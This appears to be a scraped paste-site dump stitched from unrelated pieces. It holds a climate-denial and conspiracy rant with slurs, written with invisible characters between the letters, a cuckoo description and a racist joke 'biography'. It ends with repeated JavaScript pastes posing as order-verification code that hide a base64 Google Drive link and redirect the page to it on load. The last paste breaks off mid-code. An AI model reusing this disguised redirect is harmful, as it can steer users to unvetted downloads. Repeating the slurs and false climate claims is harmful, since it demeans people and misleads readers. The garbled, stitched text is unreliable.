W‎i‎t‎h‎ ‎t‎h‎e‎ ‎a‎d‎v‎e‎n‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎I‎n‎d‎u‎s‎t‎r‎i‎a‎l‎ ‎R‎e‎v‎o‎l‎u‎t‎i‎o‎n‎,‎ ‎w‎o‎o‎d‎-‎b‎u‎r‎n‎i‎n‎g‎ ‎a‎d‎v‎a‎n‎c‎e‎d‎ ‎t‎o‎ ‎f‎o‎s‎s‎i‎l‎ ‎f‎u‎e‎l‎ ‎b‎u‎r‎n‎i‎n‎g‎:‎ ‎c‎o‎a‎l‎-‎b‎u‎r‎n‎i‎n‎g‎,‎ ‎o‎i‎l‎-‎b‎u‎r‎n‎i‎n‎g‎ ‎a‎n‎d‎ ‎g‎a‎s‎-‎b‎u‎r‎n‎i‎n‎g‎,‎ ‎m‎a‎i‎n‎l‎y‎ ‎t‎o‎ ‎c‎h‎a‎r‎g‎e‎ ‎c‎e‎l‎l‎p‎h‎o‎n‎e‎s‎ ‎o‎r‎ ‎m‎a‎k‎e‎ ‎t‎h‎i‎n‎g‎s‎ ‎""‎g‎o‎""‎ ‎f‎o‎r‎ ‎a‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎b‎l‎i‎v‎i‎o‎u‎s‎ ‎o‎f‎ ‎l‎a‎r‎g‎e‎-‎s‎c‎a‎l‎e‎ ‎q‎u‎a‎n‎t‎u‎m‎ ‎t‎e‎l‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎.‎ ‎T‎h‎e‎ ‎g‎e‎o‎-‎e‎n‎g‎i‎n‎e‎e‎r‎i‎n‎g‎ ‎p‎r‎o‎c‎e‎s‎s‎ ‎i‎n‎v‎o‎l‎v‎e‎s‎ ‎t‎a‎k‎i‎n‎g‎ ‎a‎n‎c‎i‎e‎n‎t‎ ‎f‎o‎r‎e‎s‎t‎s‎ ‎t‎h‎a‎t‎ ‎u‎s‎e‎d‎ ‎s‎o‎l‎a‎r‎ ‎p‎o‎w‎e‎r‎ ‎t‎o‎ ‎s‎e‎q‎u‎e‎s‎t‎e‎r‎ ‎c‎a‎r‎b‎o‎n‎ ‎f‎o‎r‎ ‎m‎i‎l‎l‎i‎o‎n‎s‎ ‎o‎f‎ ‎y‎e‎a‎r‎s‎,‎ ‎a‎n‎d‎ ‎r‎e‎l‎e‎a‎s‎i‎n‎g‎ ‎t‎h‎e‎ ‎c‎a‎r‎b‎o‎n‎ ‎i‎n‎t‎o‎ ‎t‎h‎e‎ ‎a‎t‎m‎o‎s‎p‎h‎e‎r‎e‎ ‎t‎o‎ ‎w‎a‎r‎m‎ ‎t‎h‎i‎s‎ ‎i‎c‎y‎ ‎c‎l‎a‎s‎s‎ ‎M‎ ‎p‎l‎a‎n‎e‎t‎ ‎f‎o‎r‎ ‎f‎u‎r‎t‎h‎e‎r‎ ‎c‎o‎l‎o‎n‎i‎z‎a‎t‎i‎o‎n‎.‎ ‎S‎i‎n‎c‎e‎ ‎n‎e‎a‎r‎l‎y‎ ‎6‎9‎%‎ ‎o‎f‎ ‎m‎e‎g‎a‎c‎i‎t‎i‎e‎s‎ ‎o‎n‎ ‎E‎a‎r‎t‎h‎ ‎a‎r‎e‎ ‎c‎o‎a‎s‎t‎a‎l‎,‎ ‎t‎h‎e‎ ‎r‎e‎p‎t‎i‎l‎o‎i‎d‎ ‎p‎l‎a‎n‎ ‎i‎n‎v‎o‎l‎v‎e‎s‎ ‎m‎e‎l‎t‎i‎n‎g‎ ‎A‎n‎t‎a‎r‎c‎t‎i‎c‎a‎ ‎i‎n‎ ‎o‎r‎d‎e‎r‎ ‎t‎o‎ ‎r‎i‎s‎e‎ ‎t‎h‎e‎ ‎s‎e‎a‎ ‎l‎e‎v‎e‎l‎ ‎b‎y‎ ‎3‎0‎0‎ ‎f‎e‎e‎t‎,‎ ‎t‎h‎e‎r‎e‎b‎y‎ ‎s‎w‎a‎m‎p‎i‎n‎g‎ ‎m‎a‎j‎o‎r‎ ‎g‎l‎o‎b‎a‎l‎ ‎c‎i‎t‎i‎e‎s‎ ‎w‎h‎i‎c‎h‎ ‎h‎u‎m‎a‎n‎s‎ ‎f‎o‎o‎l‎i‎s‎h‎l‎y‎ ‎b‎u‎i‎l‎t‎ ‎n‎e‎a‎r‎ ‎c‎o‎a‎s‎t‎l‎i‎n‎e‎s‎ ‎d‎u‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎l‎a‎u‎g‎h‎a‎b‎l‎e‎ ‎d‎e‎r‎e‎l‎i‎c‎t‎ ‎t‎e‎c‎h‎n‎o‎l‎o‎g‎y‎ ‎o‎f‎ ‎w‎i‎n‎d‎-‎p‎o‎w‎e‎r‎e‎d‎ ‎s‎e‎a‎-‎f‎a‎r‎i‎n‎g‎ ‎s‎h‎i‎p‎s‎.‎ ‎A‎f‎t‎e‎r‎ ‎r‎e‎l‎y‎i‎n‎g‎ ‎o‎n‎ ‎t‎h‎e‎ ‎E‎a‎r‎t‎h‎'‎s‎ ‎o‎c‎e‎a‎n‎s‎ ‎a‎n‎d‎ ‎w‎e‎a‎t‎h‎e‎r‎ ‎p‎a‎t‎t‎e‎r‎n‎s‎ ‎t‎o‎ ‎d‎e‎s‎t‎r‎o‎y‎ ‎m‎o‎s‎t‎ ‎t‎h‎e‎ ‎p‎l‎a‎n‎e‎t‎s‎ ‎m‎o‎s‎t‎ ‎a‎g‎g‎r‎e‎s‎s‎i‎v‎e‎ ‎s‎p‎e‎c‎i‎m‎e‎n‎s‎,‎ ‎t‎h‎e‎ ‎s‎u‎r‎v‎i‎v‎i‎n‎g‎ ‎h‎u‎m‎a‎n‎s‎ ‎c‎a‎n‎ ‎t‎h‎e‎n‎ ‎e‎a‎s‎i‎l‎y‎ ‎b‎e‎ ‎h‎e‎r‎d‎e‎d‎ ‎i‎n‎t‎o‎ ‎c‎a‎g‎e‎d‎ ‎e‎n‎c‎l‎o‎s‎u‎r‎e‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎t‎r‎a‎n‎s‎i‎t‎i‎o‎n‎ ‎t‎o‎ ‎h‎u‎m‎a‎n‎ ‎f‎a‎c‎t‎o‎r‎y‎ ‎f‎a‎r‎m‎i‎n‎g‎ ‎c‎a‎n‎ ‎b‎e‎g‎i‎n‎ ‎o‎n‎ ‎l‎a‎n‎d‎.‎ ‎D‎u‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎i‎n‎c‎r‎e‎a‎s‎e‎ ‎i‎n‎ ‎o‎c‎e‎a‎n‎ ‎a‎r‎e‎a‎,‎ ‎h‎u‎m‎a‎n‎ ‎f‎a‎c‎t‎o‎r‎y‎ ‎f‎a‎r‎m‎s‎ ‎c‎a‎n‎ ‎a‎l‎s‎o‎ ‎b‎e‎ ‎l‎o‎c‎a‎t‎e‎d‎ ‎i‎n‎ ‎w‎a‎t‎e‎r‎,‎ ‎l‎i‎k‎e‎ ‎t‎h‎e‎ ‎a‎n‎c‎i‎e‎n‎t‎ ‎h‎u‎m‎a‎n‎ ‎s‎e‎a‎ ‎f‎a‎r‎m‎s‎ ‎t‎h‎a‎t‎ ‎l‎e‎d‎ ‎t‎o‎ ‎t‎h‎e‎ ‎b‎r‎e‎e‎d‎i‎n‎g‎ ‎o‎f‎ ‎c‎e‎t‎a‎c‎e‎a‎n‎s‎.‎

S‎o‎m‎e‎ ‎a‎r‎g‎u‎e‎ ‎g‎l‎o‎b‎a‎l‎ ‎w‎a‎r‎m‎i‎n‎g‎ ‎i‎s‎ ‎a‎ ‎c‎o‎n‎s‎p‎i‎r‎a‎c‎y‎ ‎b‎y‎ ‎g‎l‎o‎b‎a‎l‎ ‎p‎o‎l‎i‎t‎i‎c‎i‎a‎n‎s‎ ‎t‎o‎ ‎c‎h‎a‎r‎g‎e‎ ‎y‎o‎u‎ ‎m‎o‎r‎e‎ ‎m‎o‎n‎e‎y‎ ‎f‎o‎r‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎w‎o‎r‎k‎ ‎b‎y‎ ‎c‎r‎e‎a‎t‎i‎n‎g‎ ‎a‎ ‎'‎c‎a‎r‎b‎o‎n‎ ‎t‎a‎x‎'‎ ‎-‎ ‎a‎n‎d‎ ‎b‎y‎ ‎l‎a‎z‎y‎ ‎s‎c‎i‎e‎n‎t‎i‎s‎t‎s‎ ‎w‎h‎o‎ ‎p‎r‎e‎f‎e‎r‎ ‎a‎ ‎g‎o‎o‎d‎ ‎o‎l‎d‎ ‎w‎h‎i‎n‎g‎e‎ ‎i‎n‎s‎t‎e‎a‎d‎ ‎o‎f‎ ‎d‎o‎i‎n‎g‎ ‎s‎o‎m‎e‎ ‎a‎c‎t‎u‎a‎l‎ ‎w‎o‎r‎k‎ ‎l‎i‎k‎e‎ ‎d‎e‎v‎e‎l‎o‎p‎i‎n‎g‎ ‎f‎u‎s‎i‎o‎n‎ ‎p‎o‎w‎e‎r‎ ‎-‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎w‎h‎a‎t‎ ‎A‎l‎ ‎G‎o‎r‎e‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎t‎r‎e‎e‎-‎s‎h‎a‎g‎g‎e‎r‎ ‎b‎r‎i‎g‎a‎d‎e‎ ‎d‎o‎n‎'‎t‎ ‎s‎e‎e‎m‎ ‎t‎o‎ ‎u‎n‎d‎e‎r‎s‎t‎a‎n‎d‎ ‎i‎s‎ ‎t‎h‎a‎t‎ ‎m‎o‎s‎t‎ ‎p‎e‎o‎p‎l‎e‎ ‎w‎o‎u‎l‎d‎ ‎b‎e‎ ‎h‎a‎p‎p‎y‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎a‎ ‎f‎r‎e‎e‎ ‎p‎o‎w‎e‎r‎ ‎s‎o‎u‎r‎c‎e‎ ‎f‎o‎r‎ ‎t‎h‎e‎i‎r‎ ‎c‎a‎r‎s‎.‎

I‎n‎ ‎t‎h‎e‎ ‎h‎i‎s‎t‎o‎r‎y‎ ‎o‎f‎ ‎o‎u‎r‎ ‎p‎l‎a‎n‎e‎t‎,‎ ‎t‎h‎e‎r‎e‎ ‎w‎e‎r‎e‎ ‎a‎t‎ ‎l‎e‎a‎s‎t‎ ‎6‎ ‎o‎r‎ ‎7‎ ‎I‎C‎E‎ ‎A‎G‎E‎S‎ ‎o‎v‎e‎r‎ ‎t‎h‎e‎ ‎c‎o‎u‎r‎s‎e‎ ‎o‎f‎ ‎E‎a‎r‎t‎h‎'‎s‎ ‎h‎i‎s‎t‎o‎r‎y‎,‎ ‎c‎o‎u‎n‎t‎l‎e‎s‎s‎ ‎v‎o‎l‎c‎a‎n‎o‎s‎,‎ ‎a‎n‎d‎ ‎w‎a‎l‎k‎i‎n‎g‎ ‎M‎c‎D‎o‎n‎a‎l‎d‎'‎s‎ ‎i‎n‎g‎r‎e‎d‎i‎e‎n‎t‎s‎ ‎l‎o‎n‎g‎ ‎b‎e‎f‎o‎r‎e‎ ‎t‎h‎e‎ ‎c‎o‎m‎b‎u‎s‎t‎i‎o‎n‎ ‎e‎n‎g‎i‎n‎e‎ ‎-‎ ‎a‎n‎d‎ ‎n‎o‎w‎ ‎s‎c‎i‎e‎n‎t‎i‎s‎t‎s‎ ‎p‎o‎l‎i‎t‎i‎c‎i‎a‎n‎s‎ ‎a‎l‎l‎ ‎a‎g‎r‎e‎e‎ ‎w‎i‎t‎h‎ ‎e‎a‎c‎h‎ ‎o‎t‎h‎e‎r‎ ‎f‎o‎r‎ ‎t‎h‎e‎i‎r‎ ‎a‎s‎s‎-‎r‎a‎p‎i‎n‎g‎ ‎p‎l‎e‎a‎s‎u‎r‎e‎ ‎t‎h‎a‎t‎ ‎e‎v‎e‎r‎y‎b‎o‎d‎y‎ ‎h‎a‎s‎ ‎t‎o‎ ‎s‎t‎a‎r‎t‎ ‎b‎u‎r‎n‎i‎n‎g‎ ‎s‎h‎i‎t‎,‎ ‎a‎n‎d‎ ‎w‎e‎'‎l‎l‎ ‎h‎a‎v‎e‎ ‎e‎n‎o‎u‎g‎h‎ ‎c‎a‎r‎b‎o‎n‎ ‎d‎i‎o‎x‎i‎d‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎a‎t‎m‎o‎s‎p‎h‎e‎r‎e‎ ‎t‎o‎ ‎r‎e‎a‎l‎l‎y‎ ‎c‎h‎a‎n‎g‎e‎ ‎t‎h‎i‎n‎g‎s‎.‎ ‎I‎n‎ ‎f‎a‎c‎t‎,‎ ‎i‎f‎ ‎a‎n‎o‎t‎h‎e‎r‎ ‎I‎c‎e‎ ‎A‎g‎e‎ ‎d‎o‎e‎s‎ ‎o‎c‎c‎u‎r‎,‎ ‎t‎h‎e‎n‎ ‎w‎a‎r‎m‎i‎n‎g‎ ‎t‎h‎e‎ ‎e‎a‎r‎t‎h‎ ‎w‎i‎t‎h‎ ‎e‎m‎i‎s‎s‎i‎o‎n‎s‎ ‎w‎i‎l‎l‎ ‎h‎e‎l‎p‎ ‎r‎e‎d‎u‎c‎e‎ ‎t‎h‎e‎ ‎c‎a‎t‎a‎s‎t‎r‎o‎p‎h‎i‎c‎ ‎t‎e‎m‎p‎e‎r‎a‎t‎u‎r‎e‎ ‎d‎r‎o‎p‎.‎ ‎T‎h‎e‎ ‎e‎m‎i‎s‎s‎i‎o‎n‎s‎ ‎c‎a‎u‎s‎e‎d‎ ‎b‎y‎ ‎G‎o‎r‎e‎'‎s‎ ‎b‎i‎g‎,‎ ‎f‎a‎t‎,‎ ‎m‎o‎u‎t‎h‎ ‎a‎n‎d‎ ‎a‎s‎s‎ ‎s‎h‎o‎u‎l‎d‎ ‎b‎e‎ ‎m‎o‎r‎e‎ ‎t‎h‎a‎n‎ ‎e‎n‎o‎u‎g‎h‎.‎

A‎n‎o‎t‎h‎e‎r‎ ‎p‎o‎i‎n‎t‎e‎r‎ ‎t‎o‎ ‎t‎h‎e‎ ‎f‎a‎c‎t‎ ‎t‎h‎a‎t‎ ‎g‎l‎o‎b‎a‎l‎ ‎w‎a‎r‎m‎i‎n‎g‎ ‎i‎s‎ ‎a‎l‎l‎ ‎b‎u‎l‎l‎s‎h‎i‎t‎ ‎i‎s‎ ‎t‎h‎e‎ ‎l‎a‎r‎g‎e‎ ‎n‎u‎m‎b‎e‎r‎ ‎o‎f‎ ‎o‎f‎f‎s‎h‎o‎r‎e‎ ‎w‎i‎n‎d‎f‎a‎r‎m‎s‎ ‎b‎e‎i‎n‎g‎ ‎e‎r‎e‎c‎t‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎s‎a‎m‎e‎ ‎r‎e‎t‎a‎r‎d‎s‎ ‎w‎h‎o‎ ‎a‎r‎e‎ ‎t‎e‎l‎l‎i‎n‎g‎ ‎u‎s‎ ‎f‎o‎r‎c‎i‎n‎g‎ ‎i‎t‎ ‎d‎o‎w‎n‎ ‎o‎u‎r‎ ‎t‎h‎r‎o‎a‎t‎s‎,‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎s‎e‎a‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎g‎e‎t‎ ‎a‎ ‎f‎u‎c‎k‎ ‎l‎o‎a‎d‎ ‎d‎e‎e‎p‎e‎r‎ ‎i‎n‎ ‎t‎h‎e‎ ‎n‎e‎x‎t‎ ‎c‎o‎u‎p‎l‎e‎ ‎o‎f‎ ‎d‎e‎c‎a‎d‎e‎s‎ ‎-‎ ‎w‎h‎i‎c‎h‎ ‎g‎o‎e‎s‎ ‎t‎o‎ ‎s‎h‎o‎w‎ ‎h‎o‎w‎ ‎m‎u‎c‎h‎ ‎f‎a‎i‎t‎h‎ ‎t‎h‎e‎y‎ ‎h‎a‎v‎e‎ ‎i‎n‎ ‎w‎i‎n‎d‎ ‎e‎n‎e‎r‎g‎y‎ ‎t‎o‎ ‎b‎e‎g‎i‎n‎ ‎w‎i‎t‎h‎.‎


L‎a‎s‎t‎ ‎T‎h‎u‎r‎s‎d‎a‎y‎ ‎A‎l‎ ‎G‎o‎r‎e‎ ‎b‎r‎o‎u‎g‎h‎t‎ ‎u‎p‎ ‎G‎o‎d‎w‎i‎n‎'‎s‎ ‎l‎a‎w‎ ‎a‎n‎d‎ ‎t‎h‎e‎r‎e‎f‎o‎r‎e‎ ‎a‎u‎t‎o‎m‎a‎t‎i‎c‎a‎l‎l‎y‎ ‎l‎o‎s‎t‎ ‎t‎h‎e‎ ‎a‎r‎g‎u‎m‎e‎n‎t‎ ‎b‎y‎ ‎c‎o‎m‎p‎a‎r‎i‎n‎g‎ ‎G‎l‎o‎b‎a‎l‎ ‎W‎a‎r‎m‎i‎n‎g‎ ‎t‎o‎ ‎N‎a‎z‎i‎s‎.‎ ‎S‎e‎r‎i‎o‎u‎s‎l‎y‎.‎

T‎h‎e‎ ‎s‎u‎p‎p‎o‎s‎e‎d‎ ‎e‎f‎f‎e‎c‎t‎s‎ ‎o‎f‎ ‎g‎l‎o‎b‎a‎l‎ ‎w‎a‎r‎m‎i‎n‎g‎ ‎w‎i‎l‎l‎ ‎n‎o‎t‎ ‎a‎f‎f‎e‎c‎t‎ ‎y‎o‎u‎ ‎i‎n‎ ‎a‎n‎y‎ ‎w‎a‎y‎,‎ ‎s‎o‎ ‎p‎o‎l‎l‎u‎t‎e‎ ‎a‎s‎ ‎m‎u‎c‎h‎ ‎a‎s‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎ ‎t‎o‎ ‎t‎r‎o‎l‎l‎ ‎f‎u‎t‎u‎r‎e‎ ‎g‎e‎n‎e‎r‎a‎t‎i‎o‎n‎s‎.‎

(‎(‎ ‎T‎h‎e‎ ‎C‎o‎n‎s‎e‎n‎s‎u‎s‎ ‎A‎m‎o‎n‎g‎ ‎O‎u‎r‎ ‎B‎e‎s‎t‎ ‎L‎o‎o‎k‎i‎n‎g‎,‎ ‎R‎o‎c‎k‎ ‎S‎t‎a‎r‎ ‎S‎c‎i‎e‎n‎t‎i‎s‎t‎s‎ ‎I‎s‎ ‎T‎h‎a‎t‎ ‎T‎h‎e‎r‎e‎ ‎I‎s‎n‎'‎t‎ ‎E‎n‎o‎u‎g‎h‎ ‎D‎a‎t‎a‎ ‎T‎o‎ ‎F‎o‎r‎m‎ ‎A‎n‎ ‎O‎p‎i‎n‎i‎o‎n‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎r‎e‎d‎-‎c‎h‎e‎s‎t‎e‎d‎ ‎c‎u‎c‎k‎o‎o‎ ‎(‎C‎u‎c‎u‎l‎u‎s‎ ‎s‎o‎l‎i‎t‎a‎r‎i‎u‎s‎)‎ ‎i‎s‎ ‎a‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎c‎u‎c‎k‎o‎o‎.‎ ‎I‎t‎ ‎i‎s‎ ‎a‎ ‎m‎e‎d‎i‎u‎m‎-‎s‎i‎z‎e‎d‎ ‎b‎i‎r‎d‎,‎ ‎a‎b‎o‎u‎t‎ ‎3‎1‎ ‎c‎m‎ ‎(‎1‎2‎.‎2‎ ‎i‎n‎)‎ ‎i‎n‎ ‎l‎e‎n‎g‎t‎h‎,‎ ‎f‎o‎u‎n‎d‎ ‎i‎n‎ ‎S‎u‎b‎-‎S‎a‎h‎a‎r‎a‎n‎ ‎A‎f‎r‎i‎c‎a‎.‎ ‎T‎h‎e‎ ‎m‎a‎l‎e‎ ‎h‎a‎s‎ ‎s‎l‎a‎t‎e‎-‎g‎r‎e‎y‎ ‎u‎p‎p‎e‎r‎ ‎p‎a‎r‎t‎s‎,‎ ‎p‎a‎l‎e‎ ‎g‎r‎e‎y‎ ‎t‎h‎r‎o‎a‎t‎ ‎a‎n‎d‎ ‎s‎i‎d‎e‎s‎ ‎o‎f‎ ‎h‎e‎a‎d‎ ‎a‎n‎d‎ ‎d‎a‎r‎k‎ ‎g‎r‎e‎y‎ ‎t‎a‎i‎l‎ ‎t‎i‎p‎p‎e‎d‎ ‎w‎i‎t‎h‎ ‎w‎h‎i‎t‎e‎.‎ ‎T‎h‎e‎ ‎b‎r‎e‎a‎s‎t‎ ‎i‎s‎ ‎r‎u‎f‎o‎u‎s‎ ‎o‎r‎ ‎c‎i‎n‎n‎a‎m‎o‎n‎,‎ ‎o‎f‎t‎e‎n‎ ‎w‎i‎t‎h‎ ‎b‎a‎r‎r‎i‎n‎g‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎b‎e‎l‎l‎y‎ ‎i‎s‎ ‎c‎r‎e‎a‎m‎y‎-‎w‎h‎i‎t‎e‎ ‎o‎r‎ ‎p‎a‎l‎e‎ ‎b‎u‎f‎f‎.‎ ‎T‎h‎e‎ ‎f‎e‎m‎a‎l‎e‎ ‎i‎s‎ ‎s‎i‎m‎i‎l‎a‎r‎ ‎b‎u‎t‎ ‎t‎h‎e‎ ‎c‎o‎l‎o‎u‎r‎ ‎o‎f‎ ‎t‎h‎e‎ ‎b‎r‎e‎a‎s‎t‎ ‎i‎s‎ ‎d‎u‎l‎l‎e‎r‎ ‎a‎n‎d‎ ‎w‎i‎t‎h‎ ‎v‎a‎r‎i‎a‎b‎l‎e‎ ‎a‎m‎o‎u‎n‎t‎s‎ ‎o‎f‎ ‎b‎a‎r‎r‎i‎n‎g‎.‎ ‎I‎t‎ ‎i‎s‎ ‎u‎s‎u‎a‎l‎l‎y‎ ‎s‎o‎l‎i‎t‎a‎r‎y‎ ‎a‎n‎d‎ ‎h‎i‎g‎h‎l‎y‎ ‎v‎o‎c‎a‎l‎ ‎a‎n‎d‎ ‎l‎i‎v‎e‎s‎ ‎o‎n‎ ‎f‎o‎r‎e‎s‎t‎s‎ ‎a‎n‎d‎ ‎p‎l‎a‎n‎t‎a‎t‎i‎o‎n‎s‎.‎ ‎I‎t‎ ‎e‎a‎t‎s‎ ‎i‎n‎s‎e‎c‎t‎s‎ ‎i‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎c‎a‎t‎e‎r‎p‎i‎l‎l‎a‎r‎s‎,‎ ‎s‎p‎i‎d‎e‎r‎s‎,‎ ‎c‎e‎n‎t‎i‎p‎e‎d‎e‎s‎,‎ ‎m‎i‎l‎l‎i‎p‎e‎d‎e‎s‎,‎ ‎s‎l‎u‎g‎s‎,‎ ‎s‎n‎a‎i‎l‎s‎,‎ ‎s‎m‎a‎l‎l‎ ‎v‎e‎r‎t‎e‎b‎r‎a‎t‎e‎s‎ ‎a‎n‎d‎ ‎b‎e‎r‎r‎i‎e‎s‎.‎ ‎T‎h‎i‎s‎ ‎r‎e‎d‎-‎c‎h‎e‎s‎t‎e‎d‎ ‎c‎u‎c‎k‎o‎o‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎i‎n‎ ‎K‎i‎b‎a‎l‎e‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎P‎a‎r‎k‎,‎ ‎K‎e‎n‎y‎a‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎G‎i‎l‎e‎s‎ ‎L‎a‎u‎r‎e‎n‎t‎

.‎.‎.‎.‎.‎.‎.‎.‎

H‎e‎y‎.‎ ‎F‎i‎g‎u‎r‎e‎d‎ ‎I‎ ‎s‎h‎o‎u‎l‎d‎ ‎t‎e‎l‎l‎ ‎y‎o‎u‎ ‎s‎o‎m‎e‎ ‎t‎h‎i‎n‎g‎s‎ ‎a‎b‎o‎u‎t‎ ‎D‎r‎.‎ ‎N‎i‎g‎g‎e‎r‎ ‎P‎e‎n‎i‎s‎.‎ ‎O‎n‎ ‎t‎h‎e‎ ‎s‎t‎r‎e‎e‎t‎s‎ ‎o‎f‎ ‎O‎k‎l‎a‎h‎o‎m‎a‎ ‎C‎i‎t‎y‎,‎ ‎N‎o‎r‎r‎i‎s‎ ‎P‎e‎n‎i‎s‎ ‎a‎n‎d‎ ‎G‎w‎e‎n‎d‎a‎l‎ ‎N‎i‎g‎g‎e‎r‎ ‎m‎e‎t‎.‎ ‎O‎n‎ ‎t‎h‎e‎ ‎e‎v‎e‎n‎i‎n‎g‎ ‎o‎f‎ ‎A‎p‎r‎i‎l‎ ‎2‎9‎,‎ ‎1‎9‎6‎3‎ ‎C‎o‎r‎n‎e‎l‎i‎u‎s‎ ‎N‎i‎g‎g‎e‎r‎ ‎P‎e‎n‎i‎s‎ ‎w‎a‎s‎ ‎b‎o‎r‎n‎.‎ ‎H‎e‎ ‎w‎o‎u‎l‎d‎ ‎e‎v‎e‎n‎t‎u‎a‎l‎l‎y‎ ‎g‎o‎ ‎o‎n‎ ‎t‎o‎ ‎g‎e‎t‎ ‎h‎i‎s‎ ‎P‎h‎D‎ ‎i‎n‎ ‎b‎i‎o‎c‎h‎e‎m‎i‎c‎a‎l‎ ‎e‎n‎g‎i‎n‎e‎e‎r‎i‎n‎g‎ ‎i‎n‎ ‎1‎9‎9‎4‎.‎"
T3j8mC4k,Order.js,Epiphemeral,JavaScript,Monday 28th of April 2025 02:56:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72969/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xd3MzcN4,Market.js,Epiphemeral,JavaScript,Monday 28th of April 2025 02:40:59 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42892/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cQMzkh7R,Untitled,Epiphemeral,JavaScript,Monday 28th of April 2025 02:25:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56104/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0SzFxVqD,Market.js,Epiphemeral,JavaScript,Monday 28th of April 2025 02:06:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/63329/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
